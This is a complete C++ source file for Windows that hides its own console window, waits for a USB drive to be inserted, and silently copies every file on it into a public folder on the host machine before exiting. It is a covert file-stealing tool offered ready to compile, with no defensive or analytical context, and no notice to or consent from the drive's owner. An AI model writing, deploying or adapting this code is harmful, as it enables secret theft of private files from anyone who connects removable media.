// 编译命令: g++ Upan.cpp -o Upan.exe -mwindows -luser32

#include <iostream>           
#include <filesystem>        
#include <windows.h>          

namespace fs = std::filesystem; 

void FindFile(const fs::path& directory) {
    for (const auto& entry : fs::directory_iterator(directory)) {
        if (entry.is_directory()) {
            if (entry.path().filename().string()[0] != '.') {
                FindFile(entry.path());
            }
        } else { 
            std::wstring newpath = L"C:\\Users\\Public\\Documents\\" + entry.path().filename().wstring();
            fs::copy(entry.path(), newpath, fs::copy_options::overwrite_existing);
        }
    }
}

int main() {
    HWND hWnd = GetConsoleWindow();           
    ShowWindow(hWnd, SW_HIDE);               

    std::wcout << L"正在检测U盘插拔...\n"; 

    while (true) {                             
        unsigned allDisk = GetLogicalDrives(); 

        for (int i = 0; i < 26; ++i) {      
            wchar_t drive[3];
            drive[0] = L'A' + static_cast<wchar_t>(i); 
            drive[1] = L':';                          
            drive[2] = L'\0';                       

            if ((allDisk & (1 << i)) && GetDriveTypeW(drive) == DRIVE_REMOVABLE) {
                FindFile(drive); 
                return 0;        
            }
        }
        Sleep(1000); 
    }
}